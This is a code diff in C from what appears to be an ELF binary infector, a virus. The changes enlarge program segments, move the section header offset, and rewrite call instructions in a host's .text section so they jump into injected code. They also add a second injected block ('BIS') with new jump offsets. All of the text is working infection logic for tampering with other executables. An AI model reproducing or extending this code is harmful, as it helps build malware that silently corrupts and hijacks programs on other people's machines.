@@ -109,8 +109,8 @@ int		find_text(t_info *info)
 			info->text_addr = header->p_vaddr;
 			header->p_filesz += INJECT_SIZE;
 			header->p_memsz += INJECT_SIZE;
-			patch_sections_header(info, info->begin_bss, info->bss_size + PAYLOAD_SIZE);
-			main_header->e_shoff += (info->bss_size + PAYLOAD_SIZE);
+			patch_sections_header(info, info->begin_bss, info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
+			main_header->e_shoff += (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
 			return (0);
 		}
 		header++;
@@ -127,15 +127,15 @@ static void	hook_call(t_info *info, int32_t nb)
 	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
 	// Add offset depending of nb
 	if (nb == 1)
-		new_jmp += 0x3a;//REPLACE1
+		new_jmp += 0x0;//REPLACE1
 	if (nb == 2)
-		new_jmp += 0x74;//REPLACE2
+		new_jmp += 0x4;//REPLACE2
 	if (nb == 3)
-		new_jmp += 0x174;//REPLACE3
+		new_jmp += 0x8;//REPLACE3
 	if (nb == 4)
-		new_jmp += 0x10e;//REPLACE4
+		new_jmp += 0xb;//REPLACE4
 	if (nb == 5)
-		new_jmp += 0x112;//REPLACE5
+		new_jmp += 0x10;//REPLACE5
 	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
 }
 
@@ -179,7 +179,7 @@ void		epo_parsing(t_info *info)
 				nb++;
 				info->addr_call_to_replace = info->text_begin + i;
 				hook_call(info, nb);
-				patch_end(info, nb);
+				patch_bis(info, nb);
 			}
 			nb_call_detected++;
 		}
@@ -203,13 +203,13 @@ int			pe_parsing(t_info *info)
 		program_header++;
 	program_header--;
 
-	info->offset_payload = program_header->p_offset + program_header->p_memsz;
-	info->addr_payload = program_header->p_vaddr + program_header->p_memsz;
+	info->offset_bis = program_header->p_offset + program_header->p_memsz;
+	info->addr_bis = program_header->p_vaddr + program_header->p_memsz;
 	info->bss_size = program_header->p_memsz - program_header->p_filesz;
 	info->begin_bss = program_header->p_offset + program_header->p_filesz;
 	if (info->begin_bss > info->file_size)
 		return (1);
-	program_header->p_memsz += PAYLOAD_SIZE;
+	program_header->p_memsz += PAYLOAD_SIZE + BIS_SIZE;
 	program_header->p_filesz = program_header->p_memsz;
 	return (0);
 }
